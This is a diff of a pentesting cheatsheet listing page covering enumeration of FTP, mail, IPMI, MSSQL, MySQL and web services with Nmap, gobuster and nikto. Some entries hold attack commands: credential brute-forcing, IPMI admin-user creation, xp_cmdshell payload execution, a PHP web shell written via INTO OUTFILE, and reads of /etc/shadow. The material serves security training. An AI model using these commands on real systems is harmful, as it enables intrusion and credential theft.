@@ -313,6 +313,239 @@ Installation sudo apt install fierce # or pip3 install fierce # or git clone htt
 <span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
   <a class="entry-link" aria-label="post link to fierce" href="https://d3vilsec.com/cheatsheets/pentesting/information-gathering-web-edition/dns-and-subdomains/fierce/"></a>
 </article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">FTP
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>FTP Enumeration Cheatsheet Default Ports: 21 (control), 20 (data - active mode)
+Banner Grabbing &amp; Connection nc -nv &lt;ip&gt; 21 telnet &lt;ip&gt; 21 ftp &lt;ip&gt; openssl s_client -connect &lt;ip&gt;:21 -starttls ftp # FTPS Anonymous Login ftp &lt;ip&gt; # Username: anonymous # Password: anonymous (or leave blank) # Via curl curl -v ftp://&lt;ip&gt;/ --user anonymous:anonymous curl -v ftp://&lt;ip&gt;/&lt;path&gt;/ --user anonymous:anonymous FTP Commands (Once Connected) USER &lt;username&gt; # Send username PASS &lt;password&gt; # Send password SYST # Display system type STAT # Status / verbose file listing LIST # List files (verbose) NLST # Name list (simple) PWD # Print working directory CWD &lt;dir&gt; # Change directory GET &lt;file&gt; # Download file PUT &lt;file&gt; # Upload file MGET * # Download all files BINARY # Switch to binary transfer mode ASCII # Switch to ASCII transfer mode PASV # Enter passive mode QUIT # Disconnect Nmap FTP Scripts nmap -p 21 --script ftp-anon &lt;ip&gt; # Check anonymous login nmap -p 21 --script ftp-banner &lt;ip&gt; # Banner grab nmap -p 21 --script ftp-brute &lt;ip&gt; # Brute force credentials nmap -p 21 --script ftp-bounce &lt;ip&gt; # FTP bounce attack check nmap -p 21 --script ftp-syst &lt;ip&gt; # SYST command response nmap -p 21 --script ftp-vsftpd-backdoor &lt;ip&gt; # vsFTPd 2.3.4 backdoor check nmap -p 21 -sV --script ftp-* &lt;ip&gt; # Run all FTP scripts Brute Force hydra -l &lt;user&gt; -P wordlist.txt ftp://&lt;ip&gt; hydra -L users.txt -P wordlist.txt ftp://&lt;ip&gt; medusa -u &lt;user&gt; -P wordlist.txt -h &lt;ip&gt; -M ftp Bulk Download # wget recursive download (no passive mode) wget -m --no-passive ftp://anonymous:anonymous@&lt;ip&gt; # curl recursive curl -s ftp://&lt;ip&gt;/ --user anonymous:anonymous | awk &#39;{print $NF}&#39; | \ while read f; do curl -s ftp://&lt;ip&gt;/$f --user anonymous:anonymous -O; done Key Vulnerabilities Software CVE Description vsFTPd 2.3.4 CVE-2011-2523 Backdoor shell on port 6200 ProFTPd 1.3.5 CVE-2015-3306 mod_copy unauthenticated file copy ProFTPd 1.3.3c CVE-2010-4221 Remote heap overflow </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to FTP" href="https://d3vilsec.com/cheatsheets/pentesting/footprinting/ftp/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">gobuster
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>gobuster Cheatsheet Type: Multi-purpose brute-forcing tool — directories, files, DNS subdomains, virtual hosts, S3 buckets
+Installation sudo apt install gobuster # or go install github.com/OJ/gobuster/v3@latest Modes Mode Description dir Directory and file brute forcing dns DNS subdomain brute forcing vhost Virtual host discovery fuzz Fuzzing (replace FUZZ keyword anywhere in URL) s3 AWS S3 bucket enumeration gcs Google Cloud Storage bucket enumeration Global Flags Flag Description -w &lt;wordlist&gt; Wordlist path -t &lt;n&gt; Threads (default: 10) -o &lt;file&gt; Output to file -q Quiet — only print results -v Verbose --no-error Suppress errors -z No progress bar --delay &lt;ms&gt; Delay between requests dir — Directory &amp; File Brute Force # Basic scan gobuster dir -u http://&lt;ip&gt; -w wordlist.txt # Common flags gobuster dir -u http://&lt;ip&gt; -w wordlist.txt \ -t 50 \ # 50 threads -x php,html,txt,bak \ # File extensions -s 200,204,301,302,307 \ # Status codes to show -b 404,403 \ # Status codes to exclude --timeout 10s \ # Request timeout -k \ # Skip TLS verification -c &#34;PHPSESSID=abc123&#34; \ # Cookie -H &#34;Authorization: Bearer tok&#34; \ # Custom header -U &lt;user&gt; -P &lt;pass&gt; \ # HTTP Basic auth -r \ # Follow redirects -e \ # Print full URL -o results.txt # HTTPS target gobuster dir -u https://&lt;ip&gt; -w wordlist.txt -k # Custom User-Agent gobuster dir -u http://&lt;ip&gt; -w wordlist.txt \ -a &#34;Mozilla/5.0&#34; dir Flags Flag Description -u &lt;url&gt; Target URL -x &lt;ext&gt; File extensions (comma-separated) -s &lt;codes&gt; Allowed status codes -b &lt;codes&gt; Blacklisted status codes -r Follow redirects -k Skip TLS certificate verification -c &lt;cookie&gt; Cookie string -H &lt;header&gt; Extra header (repeatable) -U / -P HTTP Basic auth username/password -e Print full URL in output -l Print response length --timeout &lt;dur&gt; Request timeout --wildcard Force continue if wildcard found --exclude-length &lt;n&gt; Exclude responses of this length dns — Subdomain Brute Force # Basic DNS brute force gobuster dns -d &lt;domain&gt; -w wordlist.txt # With specific resolver gobuster dns -d example.com -w wordlist.txt -r 8.8.8.8 # Show IP addresses gobuster dns -d example.com -w wordlist.txt -i # Wildcard override gobuster dns -d example.com -w wordlist.txt --wildcard dns Flags Flag Description -d &lt;domain&gt; Target domain -r &lt;resolver&gt; Custom DNS resolver -i Show IP addresses of found subdomains --wildcard Force scan even if wildcard DNS detected vhost — Virtual Host Discovery # Basic vhost scan gobuster vhost -u http://&lt;ip&gt; -w wordlist.txt # Append domain to wordlist entries gobuster vhost -u http://&lt;ip&gt; -w wordlist.txt \ --append-domain \ --domain example.com # Filter out specific response length (removes default/fallback page) gobuster vhost -u http://&lt;ip&gt; -w wordlist.txt \ --append-domain \ --exclude-length 290 # HTTPS gobuster vhost -u https://&lt;ip&gt; -w wordlist.txt -k --append-domain vhost Flags Flag Description -u &lt;url&gt; Target URL --append-domain Append base domain to each word --domain &lt;domain&gt; Base domain to append --exclude-length &lt;n&gt; Exclude responses of this content length fuzz — Generic Fuzzing # Fuzz a parameter value gobuster fuzz -u &#34;http://&lt;ip&gt;/page.php?id=FUZZ&#34; -w wordlist.txt # Fuzz with status filter gobuster fuzz -u &#34;http://&lt;ip&gt;/FUZZ.php&#34; -w wordlist.txt -b 404 Recommended Wordlists # Directories /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt /usr/share/seclists/Discovery/Web-Content/common.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt # Files (with extensions) /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt # Virtual hosts / subdomains /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt Example Full Runs # Directory &#43; file scan gobuster dir \ -u http://example.com \ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \ -x php,html,txt,bak,zip \ -t 50 -e -l \ -o gobuster_dir.txt # Virtual host discovery gobuster vhost \ -u http://example.com \ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \ --append-domain \ --exclude-length 290 \ -t 50 \ -o gobuster_vhost.txt </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>3 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to gobuster" href="https://d3vilsec.com/cheatsheets/pentesting/information-gathering-web-edition/dns-and-subdomains/gobuster/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">IMAP POP3
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>IMAP / POP3 Enumeration Cheatsheet Default Ports:
+IMAP: 143 (plain), 993 (SSL/TLS) POP3: 110 (plain), 995 (SSL/TLS) Banner Grabbing nc -nv &lt;ip&gt; 110 # POP3 nc -nv &lt;ip&gt; 143 # IMAP openssl s_client -connect &lt;ip&gt;:993 # IMAPS openssl s_client -connect &lt;ip&gt;:995 # POP3S openssl s_client -connect &lt;ip&gt;:143 -starttls imap # STARTTLS IMAP POP3 Commands (Manual) USER &lt;username&gt; PASS &lt;password&gt; STAT # Mailbox stats (message count, total size) LIST # List all messages with sizes LIST &lt;n&gt; # Info for message n RETR &lt;n&gt; # Retrieve (download) message n DELE &lt;n&gt; # Mark message n for deletion TOP &lt;n&gt; &lt;lines&gt; # Retrieve headers &#43; first N lines of message n UIDL # Unique ID listing for all messages NOOP # Keep-alive RSET # Unmark any deletions QUIT # Commit deletes and disconnect IMAP Commands (Manual) a LOGIN &lt;user&gt; &lt;pass&gt; a CAPABILITY # Show server capabilities a LIST &#34;&#34; &#34;*&#34; # List all mailboxes a SELECT INBOX # Select inbox a STATUS INBOX (MESSAGES UNSEEN) # Inbox stats a FETCH 1:* (FLAGS) # List messages with flags a FETCH 1 (BODY[]) # Download full message 1 a FETCH 1 (BODY[HEADER]) # Headers only a FETCH 1 (BODY[TEXT]) # Body only a SEARCH ALL # Search all messages a SEARCH UNSEEN # Search unread messages a EXAMINE INBOX # Read-only select a LOGOUT Nmap Scripts nmap -p 110,143,993,995 --script imap-capabilities &lt;ip&gt; nmap -p 110,143,993,995 --script pop3-capabilities &lt;ip&gt; nmap -p 110 --script pop3-brute &lt;ip&gt; nmap -p 143 --script imap-brute &lt;ip&gt; nmap -p 993,995 --script imap-ntlm-info &lt;ip&gt; # Windows NTLM info leak Brute Force hydra -l &lt;user&gt; -P wordlist.txt imap://&lt;ip&gt; hydra -l &lt;user&gt; -P wordlist.txt pop3://&lt;ip&gt; hydra -l &lt;user&gt; -P wordlist.txt -s 993 -S imap://&lt;ip&gt; # IMAPS hydra -l &lt;user&gt; -P wordlist.txt -s 995 -S pop3://&lt;ip&gt; # POP3S curl Mail Access # List mailboxes curl -k &#39;imaps://&lt;ip&gt;&#39; --user &lt;user&gt;:&lt;pass&gt; # List INBOX contents curl -k &#39;imaps://&lt;ip&gt;/INBOX&#39; --user &lt;user&gt;:&lt;pass&gt; # Read specific message curl -k &#39;imaps://&lt;ip&gt;/INBOX;MAILINDEX=1&#39; --user &lt;user&gt;:&lt;pass&gt; # POP3 via curl curl -k &#39;pop3s://&lt;ip&gt;&#39; --user &lt;user&gt;:&lt;pass&gt; curl -k &#39;pop3s://&lt;ip&gt;/1&#39; --user &lt;user&gt;:&lt;pass&gt; # Download message 1 </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to IMAP POP3" href="https://d3vilsec.com/cheatsheets/pentesting/footprinting/imap-pop3/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">IPMI
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>IPMI Enumeration Cheatsheet Default Port: 623 (UDP)
+What is IPMI? Intelligent Platform Management Interface — out-of-band management for servers (iDRAC, iLO, BMC). Can give full remote control even if OS is down.
+Detection &amp; Version nmap -sU -p 623 &lt;ip&gt; nmap -sU -p 623 --script ipmi-version &lt;ip&gt; Nmap Scripts nmap -sU -p 623 --script ipmi-version &lt;ip&gt; nmap -sU -p 623 --script ipmi-cipher-zero &lt;ip&gt; # Check for Cipher 0 auth bypass Metasploit Modules # Version detection use auxiliary/scanner/ipmi/ipmi_version set RHOSTS &lt;ip&gt; run # Dump RAKP hashes (no auth needed) use auxiliary/scanner/ipmi/ipmi_dumphashes set RHOSTS &lt;ip&gt; run # Cipher 0 auth bypass (unauthenticated admin access) use auxiliary/scanner/ipmi/ipmi_cipher_zero set RHOSTS &lt;ip&gt; run ipmitool (Direct Interaction) # Version/status ipmitool -I lanplus -H &lt;ip&gt; -U admin -P admin chassis status # List users ipmitool -I lanplus -H &lt;ip&gt; -U admin -P admin user list # LAN config ipmitool -I lanplus -H &lt;ip&gt; -U admin -P admin lan print # Power control ipmitool -I lanplus -H &lt;ip&gt; -U admin -P admin power status ipmitool -I lanplus -H &lt;ip&gt; -U admin -P admin power reset # Add user (post-compromise) ipmitool -I lanplus -H &lt;ip&gt; -U admin -P admin user set name 4 hacker ipmitool -I lanplus -H &lt;ip&gt; -U admin -P admin user set password 4 Password1 ipmitool -I lanplus -H &lt;ip&gt; -U admin -P admin user priv 4 4 # Admin priv ipmitool -I lanplus -H &lt;ip&gt; -U admin -P admin user enable 4 Hash Cracking (After RAKP Dump) # Hashcat mode 7300 = IPMI2 RAKP HMAC-SHA1 hashcat -m 7300 hashes.txt wordlist.txt hashcat -m 7300 hashes.txt wordlist.txt -r rules/best64.rule Default Credentials Vendor / Interface Username Default Password Dell iDRAC root calvin HP iLO Administrator (printed on pull tab) Supermicro IPMI ADMIN ADMIN IBM IMM USERID PASSW0RD Cisco CIMC admin password Intel RMM admin (blank) Key Vulnerabilities Issue Description Cipher 0 Allows unauthenticated auth bypass — attacker can set any password RAKP hash dump IPMI spec allows anyone to request auth hash → offline crack Default creds Most systems ship with known default credentials Anonymous auth Some BMCs allow completely anonymous access </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to IPMI" href="https://d3vilsec.com/cheatsheets/pentesting/footprinting/ipmi/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">MSSQL
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>MSSQL Enumeration Cheatsheet Default Ports: 1433 (TCP), 1434 (UDP — SQL Server Browser)
+Discovery &amp; Nmap Scripts nmap -p 1433 --script ms-sql-info &lt;ip&gt; nmap -p 1433 --script ms-sql-config &lt;ip&gt; nmap -p 1433 --script ms-sql-empty-password &lt;ip&gt; nmap -p 1433 --script ms-sql-brute &lt;ip&gt; nmap -sU -p 1434 --script ms-sql-dac &lt;ip&gt; # Discover dynamic ports via UDP nmap -p 1433 --script ms-sql-* &lt;ip&gt; # All MSSQL scripts Metasploit Modules use auxiliary/scanner/mssql/mssql_ping # Discovery &#43; version use auxiliary/scanner/mssql/mssql_login # Brute force auth use auxiliary/admin/mssql/mssql_sql # Execute SQL query use auxiliary/admin/mssql/mssql_exec # OS command execution (xp_cmdshell) use auxiliary/admin/mssql/mssql_enum # Full enumeration use auxiliary/admin/mssql/mssql_enum_sql_logins # Enumerate SQL logins mssqlclient.py (impacket) # Connect with SQL auth python3 mssqlclient.py &lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; # Connect with Windows auth python3 mssqlclient.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; -windows-auth # Connect with hash (Pass-the-Hash) python3 mssqlclient.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -hashes :&lt;nthash&gt; -windows-auth Useful SQL Queries -- Version and user info SELECT @@version; SELECT system_user; SELECT user_name(); SELECT DB_NAME(); -- Check if sysadmin SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;); SELECT IS_MEMBER(&#39;db_owner&#39;); -- List databases SELECT name FROM sys.databases; USE &lt;database&gt;; SELECT table_name FROM information_schema.tables; -- List users and roles SELECT name, type_desc FROM sys.server_principals; SELECT name FROM sys.syslogins; SELECT roles.name FROM sys.server_role_members JOIN sys.server_principals AS roles ON roles.principal_id = server_role_members.role_principal_id JOIN sys.server_principals AS members ON members.principal_id = server_role_members.member_principal_id WHERE members.name = &#39;&lt;user&gt;&#39;; xp_cmdshell (OS Command Execution) -- Enable xp_cmdshell (requires sysadmin) EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE; -- Run commands EXEC xp_cmdshell &#39;whoami&#39;; EXEC xp_cmdshell &#39;net user&#39;; EXEC xp_cmdshell &#39;powershell -enc &lt;base64payload&gt;&#39;; Linked Servers (Lateral Movement) -- Enumerate linked servers SELECT * FROM sys.servers; EXEC sp_linkedservers; -- Execute query on linked server EXECUTE(&#39;SELECT @@version&#39;) AT [&lt;linked_server&gt;]; EXECUTE(&#39;SELECT system_user&#39;) AT [&lt;linked_server&gt;]; -- Execute OS command via linked server EXECUTE(&#39;EXEC xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;) AT [&lt;linked_server&gt;]; Brute Force hydra -l sa -P wordlist.txt mssql://&lt;ip&gt; medusa -h &lt;ip&gt; -u sa -P wordlist.txt -M mssql crackmapexec mssql &lt;ip&gt; -u &lt;user&gt; -p wordlist.txt File Read / Write -- Read file (via BULK INSERT or OPENROWSET) SELECT * FROM OPENROWSET(BULK &#39;C:\Windows\win.ini&#39;, SINGLE_CLOB) AS t; -- Write file (via xp_cmdshell) EXEC xp_cmdshell &#39;echo hacked &gt; C:\inetpub\wwwroot\shell.txt&#39;; </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to MSSQL" href="https://d3vilsec.com/cheatsheets/pentesting/footprinting/mssql/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">MySQL
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>MySQL Enumeration Cheatsheet Default Port: 3306 (TCP)
+Connection &amp; Banner Grabbing nc -nv &lt;ip&gt; 3306 # Banner grab mysql -u root -h &lt;ip&gt; # No password mysql -u root -p -h &lt;ip&gt; # Prompt for password mysql -u root -p&lt;password&gt; -h &lt;ip&gt; # Inline password (no space) mysql -u root -h &lt;ip&gt; -e &#34;SELECT version();&#34; # One-liner query Nmap Scripts nmap -p 3306 --script mysql-info &lt;ip&gt; nmap -p 3306 --script mysql-databases \ --script-args mysqluser=root,mysqlpass=&#39;&#39; &lt;ip&gt; nmap -p 3306 --script mysql-empty-password &lt;ip&gt; nmap -p 3306 --script mysql-brute &lt;ip&gt; nmap -p 3306 --script mysql-audit &lt;ip&gt; nmap -p 3306 --script mysql-vuln-cve2012-2122 &lt;ip&gt; nmap -p 3306 --script mysql-* &lt;ip&gt; # All MySQL scripts Enumeration Queries -- Version and environment SELECT version(); SELECT @@version; SELECT user(); SELECT @@datadir; SELECT @@basedir; SELECT @@hostname; -- Databases and tables SHOW databases; USE &lt;database&gt;; SHOW tables; DESCRIBE &lt;table&gt;; SELECT * FROM &lt;table&gt; LIMIT 5; SELECT table_schema, table_name FROM information_schema.tables; -- Users and privileges SELECT user, host, authentication_string FROM mysql.user; SELECT user, host, password FROM mysql.user; -- older MySQL SELECT * FROM information_schema.user_privileges; SHOW GRANTS FOR &#39;&lt;user&gt;&#39;@&#39;&lt;host&gt;&#39;; SHOW GRANTS FOR CURRENT_USER(); -- Check FILE privilege SELECT user, host, File_priv FROM mysql.user; File Read / Write (Requires FILE Privilege) -- Read files SELECT LOAD_FILE(&#39;/etc/passwd&#39;); SELECT LOAD_FILE(&#39;/etc/shadow&#39;); SELECT LOAD_FILE(&#39;C:/Windows/System32/drivers/etc/hosts&#39;); -- Write files (web shell) SELECT &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; INTO OUTFILE &#39;/var/www/html/shell.php&#39;; -- Write SSH key SELECT &#39;ssh-rsa AAAA...&#39; INTO OUTFILE &#39;/root/.ssh/authorized_keys&#39;; Brute Force hydra -l root -P wordlist.txt mysql://&lt;ip&gt; hydra -L users.txt -P wordlist.txt mysql://&lt;ip&gt; medusa -h &lt;ip&gt; -u root -P wordlist.txt -M mysql User-Defined Functions (UDF) for Privilege Escalation -- Check if plugin dir is writable (post-login) SHOW variables LIKE &#39;plugin_dir&#39;; -- Drop malicious UDF .so/.dll into plugin dir, -- then create the function and execute OS commands CREATE FUNCTION sys_exec RETURNS INT SONAME &#39;lib_mysqludf_sys.so&#39;; SELECT sys_exec(&#39;id &gt; /tmp/out&#39;); Common Credentials to Try root : (blank) root : root root : password root : mysql root : toor admin : admin </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to MySQL" href="https://d3vilsec.com/cheatsheets/pentesting/footprinting/mysql/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">netcraft
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Netcraft Cheatsheet Purpose: Passive reconnaissance — hosting history, OS / web server history, SSL certificate history, site report, and subdomain discovery for a target domain. Uses Netcraft’s long-running internet survey, so no traffic touches the target.
+Format: Web service. Free site-report lookups; subdomain search; commercial APIs for bulk.
+Access Points Surface URL Site Report (single site) https://sitereport.netcraft.com/?url= Subdomain / Domain search https://searchdns.netcraft.com/ What’s that site running? (legacy) https://toolbar.netcraft.com/site_report?url= Phishing / takedown reporting https://report.netcraft.com/ Anti-phishing browser extension https://www.netcraft.com/apps/ Quick Lookups (URL-style) # Site Report xdg-open &#34;https://sitereport.netcraft.com/?url=https://target.tld&#34; # Subdomain search (DNS knowledge, not zone transfer) xdg-open &#34;https://searchdns.netcraft.com/?host=*.target.tld&#34; # Scrape subdomain list (HTML — fragile, format may change) curl -s -A &#34;Mozilla/5.0&#34; \ &#34;https://searchdns.netcraft.com/?restriction=site&#43;ends&#43;with&amp;host=target.tld&#34; \ | grep -oE &#39;[a-zA-Z0-9.-]&#43;\.target\.tld&#39; | sort -u What the Site Report Reveals Background: site title, description, language, first-seen date Network: IPv4/IPv6, ASN, netblock owner, hosting country, nameservers, reverse DNS Hosting history: OS, web server, hosting provider, IP changes over time (often years) SSL/TLS: certificate issuer, valid-from / valid-to, signature alg, key size, full chain Web trackers: analytics, ad networks, tag managers Site technologies: server-side language, CMS, JS frameworks (similar surface to Wappalyzer/WhatWeb but historical) Risk rating: Netcraft’s own risk scoring (popularity, reputation, phishing flags) OSINT Pivots Hosting history → identify legacy IPs that may still serve content (origin behind CDN, forgotten staging). SSL history → past CN / SAN entries leak retired subdomains and internal hostnames. Same nameservers &#43; hosting across multiple sites → infrastructure attribution. First-seen date → useful for triaging suspicious / typosquat domains. Subdomain Discovery https://searchdns.netcraft.com/?host=*.target.tld Returns publicly known hosts under a domain. Complement, do not replace, [[crt.sh]] / amass / subfinder — Netcraft sees long-tail hosts those miss, and vice versa. Free tier paginates and rate-limits aggressively; expect a CAPTCHA on bulk. Workflow Example DOMAIN=target.tld # 1. Open Site Report xdg-open &#34;https://sitereport.netcraft.com/?url=https://$DOMAIN&#34; # 2. Pull subdomain list (best-effort scrape) curl -s -A &#34;Mozilla/5.0&#34; \ &#34;https://searchdns.netcraft.com/?restriction=site&#43;ends&#43;with&amp;host=$DOMAIN&#34; \ | grep -oE &#34;[a-zA-Z0-9.-]&#43;\.$DOMAIN&#34; | sort -u &gt; netcraft-subs.txt # 3. Cross-check with crt.sh curl -s &#34;https://crt.sh/?q=%25.$DOMAIN&amp;output=json&#34; \ | jq -r &#39;.[].name_value&#39; | tr &#39;,&#39; &#39; &#39; | sort -u &gt; crtsh-subs.txt # 4. Merge sort -u netcraft-subs.txt crtsh-subs.txt &gt; all-subs.txt Browser Extension Netcraft’s anti-phishing extension shows live Site Report data inline:
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span>3 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to netcraft" href="https://d3vilsec.com/cheatsheets/pentesting/information-gathering-web-edition/fingerprinting/netcraft/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">nikto
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Nikto Cheatsheet Purpose: Web server scanner — checks for dangerous files, outdated server software, misconfigurations, and known vulnerabilities.
+Basic Usage nikto -h &lt;target&gt; # Scan a target (default port 80) nikto -h https://target.tld # HTTPS target nikto -h &lt;ip&gt; -p 443 -ssl # Force SSL on custom port nikto -h &lt;ip&gt; -p 80,443,8080,8443 # Multiple ports nikto -h hosts.txt # Scan a list of targets Common Flags Flag Description -h &lt;host&gt; Target host, URL, or file of hosts -p &lt;ports&gt; Port(s) — single, list, or range -ssl Force SSL/TLS -nossl Disable SSL -root &lt;path&gt; Prepend root path to all requests -vhost &lt;host&gt; Set virtual host (Host header) -id &lt;user:pass&gt; HTTP Basic auth -useragent &lt;ua&gt; Custom User-Agent -useproxy &lt;url&gt; Route through proxy -Display &lt;opts&gt; Output verbosity flags (see below) -Format &lt;fmt&gt; Output format: csv, htm, txt, xml, json, sql -output &lt;file&gt; Write report to file -Tuning &lt;ids&gt; Limit checks to specific categories -Plugins &lt;list&gt; Run specific plugins only -evasion &lt;ids&gt; IDS evasion techniques -timeout &lt;s&gt; Per-request timeout -maxtime &lt;s/m/h&gt; Hard scan time limit (e.g. 30m) -Pause &lt;s&gt; Pause between requests -ask no Don’t prompt to submit findings -update Update plugins / databases -list-plugins List installed plugins Output nikto -h https://target.tld -o report.html -Format htm nikto -h &lt;ip&gt; -o nikto.json -Format json nikto -h &lt;ip&gt; -o nikto.xml -Format xml nikto -h &lt;ip&gt; -o nikto.csv -Format csv -Display flags (combine, e.g. -Display 1V):
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span>3 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to nikto" href="https://d3vilsec.com/cheatsheets/pentesting/information-gathering-web-edition/fingerprinting/nikto/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Nmap
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Nmap Cheatsheet Default Ports: N/A (scanner tool)
+Scan Types Flag Description -sS SYN scan (stealth, default with root) -sT TCP connect scan (no root needed) -sU UDP scan -sV Service/version detection -sC Default scripts -sA ACK scan (firewall mapping) -sN NULL scan -sF FIN scan -sX Xmas scan -sn Ping sweep (no port scan) -O OS detection -A Aggressive (OS &#43; version &#43; scripts &#43; traceroute) Port Specification nmap -p 22 # Single port nmap -p 22,80,443 # Multiple ports nmap -p 1-1024 # Port range nmap -p- # All 65535 ports nmap --top-ports 1000 # Top 1000 ports nmap -F # Fast scan (top 100) Timing Templates Flag Name Description -T0 Paranoid IDS evasion, very slow -T1 Sneaky Slow, IDS evasion -T2 Polite Slower, less bandwidth -T3 Normal Default -T4 Aggressive Faster, reliable network -T5 Insane Very fast, may miss results Output Formats nmap -oN output.txt # Normal output nmap -oX output.xml # XML output nmap -oG output.gnmap # Grepable output nmap -oA output # All formats at once Host Discovery nmap -sn 192.168.1.0/24 # Ping sweep nmap -PS22,80,443 192.168.1.0/24 # TCP SYN ping nmap -PA80 192.168.1.0/24 # TCP ACK ping nmap -PU53 192.168.1.0/24 # UDP ping nmap -PE 192.168.1.0/24 # ICMP echo ping nmap --disable-arp-ping 192.168.1.1 # Skip ARP discovery Evasion &amp; Spoofing nmap -D RND:5 &lt;target&gt; # Decoy scan (5 random decoys) nmap -D decoy1,decoy2 &lt;target&gt; # Named decoys nmap -S &lt;spoof-ip&gt; &lt;target&gt; # Spoof source IP nmap --spoof-mac 0 &lt;target&gt; # Random MAC spoof nmap -f &lt;target&gt; # Fragment packets nmap --mtu 24 &lt;target&gt; # Custom MTU (must be multiple of 8) nmap --data-length 25 &lt;target&gt; # Append random data to packets nmap --scan-delay 5s &lt;target&gt; # Delay between probes nmap -sI &lt;zombie&gt; &lt;target&gt; # Idle/zombie scan nmap --proxies socks4://host:port # Route through proxy NSE Scripts nmap --script=&lt;name&gt; &lt;target&gt; # Run specific script nmap --script=&lt;category&gt; &lt;target&gt; # Run entire category nmap --script-help=&lt;name&gt; # Get help for a script nmap --script-updatedb # Update script database # Script categories: # auth, broadcast, brute, default, discovery, # dos, exploit, external, fuzzer, intrusive, # malware, safe, version, vuln Common Scan Combos # Quick full port scan nmap -p- --min-rate 5000 -T4 &lt;target&gt; # Detailed enum after port discovery nmap -p &lt;ports&gt; -sV -sC -O &lt;target&gt; # Aggressive all-in-one nmap -A -p- &lt;target&gt; # Stealth SYN &#43; version detection nmap -sS -sV -p- -T4 &lt;target&gt; # UDP top ports nmap -sU --top-ports 100 &lt;target&gt; # Vulnerability scan nmap --script vuln &lt;target&gt; # Banner grabbing nmap -sV --script banner &lt;target&gt; </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to Nmap" href="https://d3vilsec.com/cheatsheets/pentesting/footprinting/nmap/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Oracle TNS
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Oracle TNS Enumeration Cheatsheet Default Port: 1521 (TCP)
